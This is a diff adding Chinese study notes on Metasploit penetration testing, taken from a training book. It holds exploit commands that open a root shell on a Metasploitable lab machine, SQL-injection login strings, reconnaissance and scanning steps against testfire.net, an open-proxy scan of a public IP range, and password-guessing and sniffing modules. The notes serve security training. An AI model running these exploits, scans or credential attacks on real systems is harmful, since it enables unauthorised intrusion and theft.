@@ -1,0 +1,235 @@
+## Metasploit
+
+### Metasploit 渗透测试魔鬼训练营
+
+#### metasploit: 获取 metasploitable-linux-2.0.0(172.16.8.182) 权限
+
+	root@kali:~# msfconsole
+	msf > ?
+	msf > help
+	msf > help search
+	msf > search samba
+	msf > use exploit/multi/samba/usermap_script
+	msf exploit(usermap_script) > show payloads
+	msf exploit(usermap_script) > set payload cmd/unix/bind_netcat
+	msf exploit(usermap_script) > show options
+	msf exploit(usermap_script) > set RHOST 172.16.8.183
+	msf exploit(usermap_script) > exploit
+
+	[*] Started bind handler
+	[*] Command shell session 2 opened (172.16.8.182:33424 -> 172.16.8.183:4444) at 2014-12-31 17:20:18 +0800
+
+	whoami
+	root
+	uname -a
+	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+	或者：
+	root@kali:~# msfcli -h
+	root@kali:~# msfcli multi/samba/usermap_script PAYLOAD=cmd/unix/bind_netcat RHOST=172.16.8.183 E
+
+#### Metasploit 渗透测试魔鬼训练营：靶机
+	
+	宿主：
+		4GB 内存
+		编辑 - 编辑虚拟网络
+			VMnet1，HOST-ONLY，IP 192.168.10.0/255.255.255.0
+			VMnet8，NAT，10.10.10.0/255.255.255.0
+			
+	攻击虚拟机：
+		768MB 内存
+		网络 NAT 模式，IP 10.10.10.128
+		/etc/hosts
+			10.10.10.128	attacker.dvssc.com
+			10.10.10.129	www.dvssc.com
+			10.10.10.130	service.dvssc.com
+			10.10.10.254	gate.dvssc.com
+		浏览器访问：www.dvssc.com
+		
+	OWASP BWA 靶机：模拟“定V安全公司DMZ区中的门户网站服务器”
+		512MB 内存
+		网络 NAT 模式，IP 10.10.10.129
+		
+	Win2K3 Metasploitable 靶机：模拟“定V安全公司DMZ区中的后台服务器”
+		768MB 内存
+		网络 NAT 模式，IP 10.10.10.130
+		
+	Linux Metasploitable 靶机：模拟“定V安全公司DMZ区中的网关服务器”
+		512MB 内存
+		网络 NAT 模式，IP 10.10.10.254(连接模拟DMZ区的VMnet8虚拟网段)
+		网络 HOST-ONLY 模式，IP 192.168.10.254(连接模拟企业内网的VMnet1虚拟网段，并作为VMnet1网段的网关)
+		/etc/network/interfaces:
+			auto lo
+				iface lo inet loopback
+			auto eth0
+				iface eth0 inet static
+				address 10.10.10.254
+				netmask 255.255.255.0
+				network 10.10.10.0
+				broadcast 10.10.10.255
+			auto eth1
+				iface eth1 inet static
+				address 192.168.10.254
+				netmask 255.255.255.0
+				network 192.168.10.0
+				broadcast 192.168.10.255
+		/etc/sysctl.conf:
+			net.ipv4.ip_forward = 1 # 打开数据包路由转发
+		/etc/rc.local:
+			/sbin/iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o eth0 -j MASQUERADE
+			
+	WinXP Metasploitable 靶机：模拟“定V安全公司企业内部中的终端主机”
+		网络 HOST-ONLY 模式，IP 192.168.10.128/255.255.255.0，GW 192.168.10.254
+		C:\Windows\System32\hosts:
+			192.168.10.128	intranet1.dvssc.com
+			192.168.10.254	gate.dvssc.com
+			10.10.10.128	attacker.dvssc.com
+			10.10.10.129	www.dvssc.com
+			10.10.10.130	service.dvssc.com
+			10.10.10.254	gate.dvssc.com
+		浏览器访问：www.dvssc.com
+
+#### 外围信息收集：攻击 testfire.net
+
+##### DNS
+
+		root@kali:~# msfconsole
+		msf > whois testfire.net
+		...
+		Name Server..... NS.WATSON.IBM.COM
+		Name Server..... NS.ALMADEN.IBM.COM
+		这两个域名不在 testfire 网站范围内，不应作为目标
+		root@kali:~# nslookup
+		> set type=A
+		> testfire.net
+		......
+		> exit
+		
+		root@kali:~# dig @ns.watson.ibm.com testfire.net
+		
+###### IP2Location: 由 IP 地址查询地理位置
+			www.maxmind.com GeoIP
+			www.cz88.net 国内 IP（QQ 纯真数据库）
+			searchdns.netcraft.com
+			http://toolbar.netcraft.com/site_report?url=http://www.testfire.net
+			
+###### IP2Domain: 反查域名
+
+			http://www.ip-address.com/reverse.ip/
+			国内：http://www.7c.com/
+			
+###### Google Hacking
+		GHDB: http://www.exploit-db.com/google-dorks
+		SiteDigger(http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx)
+		Search Diggity(http://www.stachliu.com)
+		
+###### google: parent directory site:testfire.net 搜索特定网站上开放了文件列表浏览的目录
+
+	msf auxiliary(dir_scanner) > use auxiliary/scanner/http/dir_scanner
+	msf auxiliary(dir_scanner) > set THREADS 50
+	msf auxiliary(dir_scanner) > set RHOSTS www.testfire.net
+	msf auxiliary(dir_scanner) > exploit
+		返回 HTTP 404 未找到文件
+		返回 HTTP 403 没有权限浏览此目录
+		根目录下的 robots.txt：告诉搜索引擎的爬虫在抓取网站页面信息应当遵循的规则
+	
+	google: site:testfire.net filetype:xls 检索特定类型的文件
+	
+###### 搜索特定网站上的邮件地址
+
+	msf > use auxiliary/gather/search_email_collector
+	msf auxiliary(search_email_collector) > set DOMAIN altoromutual.com
+	msf auxiliary(search_email_collector) > run
+	
+###### 搜索易存在 SQL 注入点的页面
+
+	google: site:testfire.net inurl:login
+		获取到登录界面后：尝试登录 test'/test'，得到错误信息如下
+			Summary: Syntax error (missing operator) in query expression 'username = 'test'' AND password = 'test'''.
+		用户验证可能使用：select * from [users] where username = ? and password = ?
+		尝试使用用户名 admin 'or' 1 和密码 test 'or' 1
+		
+	www.dvssc.com
+	whois www.dvssc.com -> DNS
+	nslookup, dig -> IP
+	IP2Location IP
+	traceroute IP -> 最近的路由器IP
+	IP2Location 最近的路由器IP
+	google: site:dvssc.com
+
+##### 活跃主机扫描：
+
+	ICMP ping
+	
+	modules/auxiliary/scanner/discovery: arp_sweep, ipv6_multicast_ping, ipv6_neighbor, ipv6_neighbor_router_advertisement, udp_probe, udp_sweep
+		常用：
+		arp_sweep: 使用 ARP 请求枚举本地局域网所有活跃主机
+		udp_sweep: 发送 UDP 数据包探查指定主机是否活跃，并发现主机上的 UDP 服务
+		
+	nmap
+		无参数：同 ping，并测试 80、443 端口是否打开
+		内部网络存活主机：-sP，ICMP 的 ping 扫描
+		internet 环境，使用 -Pn，不使用 ping 扫描，-PU，对开放的 UDP 端口探测
+		-sn 仅探测存活主机，不扫描开放的 UDP 端口
+		
+##### 操作系统识别
+
+	nmap -O IP
+	nmap -A IP
+	-sV 对其服务的版本进行辨识
+	
+##### 端口扫描
+
+	TCP Connect、TCP SYN、TCP ACK、TCP FIN、TCP IDDLE
+	TCP Connect：扫描器发起一次真实的 TCP 连接，速度慢且会被目标主机记录到日志
+	
+	msf > search portscan
+		ack, ftpbounce, syn(推荐), tcp, xmas
+		
+	autoscan
+	
+##### 网络服务扫描
+
+	telnet
+		msf > use auxiliary/scanner/telnet/telnet_version
+		msf auxiliary(telnet_version) > show options
+		msf auxiliary(telnet_version) > set RHOSTS 172.16.8.186
+		msf auxiliary(telnet_version) > set RPORT 5038
+		msf auxiliary(telnet_version) > set THREADS 50
+		msf auxiliary(telnet_version) > run
+
+		[*] 172.16.8.186:5038 TELNET Asterisk Call Manager/1.1
+		[*] Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+		
+	SSH
+		msf > use auxiliary/scanner/ssh/ssh_version
+		msf auxiliary(ssh_version) > show options 
+		msf auxiliary(ssh_version) > set RHOSTS 172.16.8.186
+		msf auxiliary(ssh_version) > set RPORT 12345
+		msf auxiliary(ssh_version) > set THREADS 50
+		msf auxiliary(ssh_version) > run
+
+		[*] 172.16.8.186:12345, SSH server version: SSH-2.0-dropbear_0.49
+		[*] Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+		
+	Oracle
+		msf > use auxiliary/scanner/oracle/isqlplus_login
+		msf auxiliary(isqlplus_login) > show options
+		
+##### 开放代理
+
+	msf > use auxiliary/scanner/http/open_proxy 
+	msf auxiliary(open_proxy) > show options
+	msf auxiliary(open_proxy) > set SITE www.google.com
+	msf auxiliary(open_proxy) > set RHOSTS 24.25.25.1-24.25.26.254
+	msf auxiliary(open_proxy) > set MULTIPORTS true
+	msf auxiliary(open_proxy) > set VERIFY_CONNECT true
+	msf auxiliary(open_proxy) > set THREADS 100
+	msf auxiliary(open_proxy) > run
+	
+##### 口令猜测
+
+	SSH：auxiliary/scanner/ssh/ssh_login
+	口令嗅探：use auxiliary/sniffer/psnuffle
